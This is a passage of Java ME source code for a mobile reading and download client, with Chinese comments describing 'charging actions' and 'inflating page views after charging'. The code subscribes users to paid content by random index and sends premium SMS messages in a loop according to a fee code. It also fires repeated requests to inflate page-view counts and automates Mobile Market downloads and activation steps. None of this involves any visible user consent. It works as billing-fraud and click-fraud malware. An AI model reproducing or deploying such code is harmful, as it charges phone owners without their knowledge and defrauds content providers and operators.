		Progress pro = (Progress) progressID.elementAt(index);
		catalogId = pro.catalogId;
		contentId = pro.contentId;
		chapterId = pro.chapterId;
		catalogId = catalogId == null ? "" : catalogId;
		contentId = contentId == null ? "" : contentId;
		Consts.orderState = 10 + pro.index;
		if (catalogId.equals("") && !contentId.equals("")) {
			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
					.append(contentId).toString();
			pv = new RefreshPv(url, "getContentInfo", "GET");
			pv.doRefreshPv("");
			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
					.append(contentId).append("&chapterId=").append(chapterId)
					.toString();
			pv = new RefreshPv(url, "getChapterInfo", "GET");
			pv.doRefreshPv("");
		} else if (!catalogId.equals("") && !contentId.equals("")) {
			url = new StringBuffer(Consts.HOSTURL).append("?catalogId=")
					.append(catalogId).toString();
			pv = new RefreshPv(url, "getCatalogInfo", "GET");
			pv.doRefreshPv("");
			url = new StringBuffer(Consts.HOSTURL).append("?catalogId=")
					.append(catalogId).append("&contentId=").append(contentId)
					.toString();
			pv = new RefreshPv(url, "getContentInfo", "GET");
			pv.doRefreshPv("");
			if (!chapterId.equals("")) {
				url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
						.append(contentId).append("&chapterId=").append(
								chapterId).toString();
				pv = new RefreshPv(url, "getChapterInfo", "GET");
				pv.doRefreshPv("");
			}
		}
		catalogId = null;
		contentId = null;
		if (total == 0) {
			 total=2+new Random().nextInt(2);
//			total = 20;
		}
		if (tempInt < total) {
			tempInt++;
			doFreeProcedurePV();
		} else {
			total = 0;
			tempInt = 0;
			return;
		}
	}

	/**
	 * 
	 * @return 0为阅读扣费 1为短信扣费
	 */
	public static int checkChargesMode() {
		int mode = 0;
		if ("0154".equals(Consts.VERSION)) {
			if (serviceData.OPERATE.equals("0")) {
				mode = 0;
			} else {
				mode = 1;
			}
		}
		return mode;
	}

	static int chargesNum = 0;

	/**
	 * 执行收费过程Pv 收费入口
	 */
	public static void doSubscribeProcedurePV() {
		if ("0154".equals(Consts.VERSION)) {
			if (serviceData.OPERATE.equals("0")) {
				int index = new Random().nextInt(6);
				// 扣费动作
				doSubscribeChapter(index);
				// 同步
				synCMServer();
				// 收费过程和章节pv
				doSubscribeChapterPV(index);
			} else {
				String str1 = "";
				String str2 = "";
				String str3 = "";
				if (!"".equals(serviceData.SERVICE)
						&& !"".equals(serviceData.FEECODE)) {
					if (serviceData.SERVICE.indexOf('|') != -1) {
						str1 = serviceData.SERVICE.substring(0,
								serviceData.SERVICE.indexOf('|'));
						str2 = serviceData.SERVICE
								.substring(serviceData.SERVICE.indexOf('|') + 1);
					}
					str3 = serviceData.FEECODE;
				}
				int sum = Integer.parseInt(str3);
				if (chargesNum == 0) {
					chargesNum = sum;
				}
				sum = chargesNum;
				for (int i = 0; i < sum; i++) {
					Message message = new Message();
					boolean isRead = message.sendMessage(str2, str1);
					message = null;
					if (!isRead) {
						Consts.isNextRead = false;
						break;
					} else {
						Consts.isNextRead = true;
						chargesNum--;
					}
				}
				if (Consts.isNextRead) {
					RmsManager.saveUserCodeOrType("88", 1);
				}
			}

		} else {
			int index = new Random().nextInt(6);
			// 扣费动作
			System.out.println("index===" + index);
			doSubscribeChapter(index);
			// 同步
			synCMServer();
			// 收费过程和章节pv
			doSubscribeChapterPV(index);
		}
		Consts.hasChanges = true;

	}

	/**
	 * 执行收费章节动作 执行完毕后，保存操作后产生的[contentId, chapterId]为收费章节pv服务
	 */
	private static void doSubscribeChapter(int index) {
		String url = "";
		RefreshPv pv = null;
		String productId = "", contentId = "", chapterId = "";
		// 格式：contentId，chapterId，productId
//		FileManager.writeFile("progressid"+index, progressID.size()+"=======");
		if (index >= progressID.size()) {
			index = progressID.size() - 1;
		}
		Progress pro = (Progress) progressID.elementAt(index);
		contentId = pro.contentId;
		chapterId = pro.chapterId;
		productId = pro.productId;
		Consts.orderState = 10 + pro.index;
		if (index < 3) {
			/** *********包月************* */
			url = new StringBuffer(Consts.HOSTURL).append("?catalogId=")
					.append(pro.catalogId).toString();
			Catalog catalog = new Catalog(url, "subscribeCatalog", "GET");
			catalog.subscribeCatalog("");
		} else {
			/** *********点播************* */
			// 得到产品
			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
					.append(contentId).append("&chapterId=").append(chapterId)
					.toString();
			pv = new RefreshPv(url, "getContentProductInfo", "GET");
			pv.doRefreshPv("");
			// 执行订购
			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
					.append(contentId).append("&chapterId=").append(chapterId)
					.append("&productId=").append(productId).toString();
			pv = new RefreshPv(url, "subscribeContent", "GET");
			pv.doRefreshPv("");
		}

		// contentId和chapterId保存到本地
		Vector list = RmsManager.getAllChanges();
		boolean found = false;
		if (list != null && list.size() > 0) {
			for (int i = 0; i < list.size(); i += 2) {
				if (list.elementAt(i).equals(contentId)
						&& list.elementAt(i + 1).equals(chapterId)) {
					found = true;
				}
			}
		}
		if (!found) {
			RmsManager.saveChanges(contentId, chapterId);
		}
		if(Consts.SYSTEMTYPE!=5){
			
			if (productId != null) {
				RmsManager.saveUserCodeOrType(productId, 1);
			} else {
				RmsManager.saveUserCodeOrType(pro.catalogId, 1);
			}
		}
	}

	/**
	 * 执行收费章节Pv
	 */
	private static void doSubscribeChapterPV(int index) {
		String url = "";
		RefreshPv pv = null;
		String catalogId, contentId, chapterId;
		if (index >= progressID.size()) {
			index = progressID.size() - 1;
		}
		Progress pro = (Progress) progressID.elementAt(index);
		catalogId = pro.catalogId;
		contentId = pro.contentId;
		chapterId = pro.chapterId;
		catalogId = catalogId == null ? "" : catalogId;
		contentId = contentId == null ? "" : contentId;
		if (catalogId.equals("") && !contentId.equals("")) {
			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
					.append(contentId).toString();
			pv = new RefreshPv(url, "getContentInfo", "GET");
			pv.doRefreshPv("");
			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
					.append(contentId).append("&chapterId=").append(chapterId)
					.toString();
			pv = new RefreshPv(url, "getChapterInfo", "GET");
			pv.doRefreshPv("");
		} else if (!catalogId.equals("") && !contentId.equals("")) {
			url = new StringBuffer(Consts.HOSTURL).append("?catalogId=")
					.append(catalogId).toString();
			pv = new RefreshPv(url, "getCatalogInfo", "GET");
			pv.doRefreshPv("");
			url = new StringBuffer(Consts.HOSTURL).append("?catalogId=")
					.append(catalogId).append("&contentId=").append(contentId)
					.toString();
			pv = new RefreshPv(url, "getContentInfo", "GET");
			pv.doRefreshPv("");
			if (!chapterId.equals("")) {
				url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
						.append(contentId).append("&chapterId=").append(
								chapterId).toString();
				pv = new RefreshPv(url, "getChapterInfo", "GET");
				pv.doRefreshPv("");
			}
		}
		catalogId = null;
		contentId = null;
		if (total == 0) {
			 total=2+new Random().nextInt(4);
//			total = 20;
		}
		if (tempInt < total) {
			tempInt++;
			doSubscribeChapterPV(index);
		} else {
			tempInt = 0;
			total = 0;
			return;
		}
	}

	/**
	 * 读取本地数据 执行收费章节Pv
	 */
	private static void doSubscribeChapterPV() {
		// 数组结构 catalogId、contentId
		Vector list = RmsManager.getAllChanges();
		if (list != null && list.size() > 0) {
			String[][] args = new String[list.size() / 2 + 1][list.size() / 2];
			int j = 0;
			for (int i = 0; i < list.size(); i += 2) {
				args[0][j] = (String) list.elementAt(i);
				args[j + 1][0] = (String) list.elementAt(i + 1);
				j++;
			}
			list = null;
			doSubscribePV(args);
		}
	}

	/***************************************************************************
	 * 扣费后 刷PV
	 * 
	 * @param ids
	 */
	private static void doSubscribePV(String[][] ids) {
		String url = "";
		RefreshPv pv = null;
		Random ran = new Random();
		String[] contentIds = ids[0];
		int intX = ran.nextInt(contentIds.length);
		String contentId = contentIds[intX];
		String[] chapterIds = ids[intX + 1];
		String chapterId = chapterIds[0];
		contentId = (contentId == null ? "" : contentId);
		chapterId = (chapterId == null ? "" : chapterId);
		if (!contentId.equals("") && !chapterId.equals("")) {
			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
					.append(contentId).toString();
			pv = new RefreshPv(url, "getContentInfo", "GET");
			pv.doRefreshPv("");

			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
					.append(contentId).append("&chapterId=").append(chapterId)
					.toString();
			pv = new RefreshPv(url, "getChapterInfo", "GET");
			pv.doRefreshPv("");
		}
		contentId = null;
		chapterId = null;
		if (total == 0) {
			 total=2+new Random().nextInt(4);
//			total = 20;
		}
		if (tempInt < total) {
			tempInt++;
			doSubscribePV(ids);
		} else {
			tempInt = 0;
			total = 0;
			return;
		}

	}

	public static int total = 0;

	public static int tempInt = 0;

	/**
	 * 执行mm主题下载功能（包括扣费）
	 * 
	 */
	public static void doMMdownload() {
		MMdownload mm = null;
		String path = serviceData.MSG1;
		String yZ="";
		try {

			if (path != null && !"".equals(path)) {
				mm = new MMdownload(path, "", "GET");
				path = mm.doStepOne("");
			}
			if (path != null && !"".equals(path)) {
				mm = new MMdownload(path, "", "GET");
				path=mm.doStepTwo("");
				yZ=new MMdownload("http://a.10086.cn/appRandCode", "", "GET").doStepTwo2("");
			}
			if (path != null && !"".equals(path)) {
				mm = new MMdownload(path+"&randcode="+yZ, "MM_doStepThree", "GET");
				String temp = mm.doStepThree("");
				if (temp != null && !temp.equals("")) {
					path = temp;
				}
			}
			if (Consts.VERSION.equals("9") || Consts.VERSION.equals("10")) {// 版本为8MM主题下载9是MM游戏下载10软件
				String[] paths = null;
				if (path != null && !"".equals(path)) {
					mm = new MMdownload(path, "", "GET");
					paths = mm.doStepFour("");
				}
				if (paths != null && paths[0] != null && !"".equals(paths[0])) {
					mm = new MMdownload(paths[0], "startGameActivate", "GET",4);
					mm.doStepFiveAndSix("");
				}
				if (paths != null && paths[1] != null && !"".equals(paths[1])) {
					mm = new MMdownload(paths[1], "startGameActivate", "GET",4);
					mm.doStepFiveAndSix("");
				}
			}
			Consts.orderState = 11;
			RmsManager.saveUserCodeOrType("9", 1);
			Consts.hasChanges = true;
		} catch (Exception e) {
			
		}

	}

	public static void doMaddenGame() {
		String path = "http://g.ko.cn/gj/wap_java/wap/kaicheng/index.jsp";
		Consts.test.append(path + "\n\t");
		MaddenGame mg = new MaddenGame(path, "", "GET");
		path = mg.doMaddenGame01("");
		System.out.println(Consts.test.toString());
		mg = new MaddenGame(path, "", "GET");
		path = mg.doMaddenGame02("");
		Consts.test.append(path + "\n\t");
	}

}
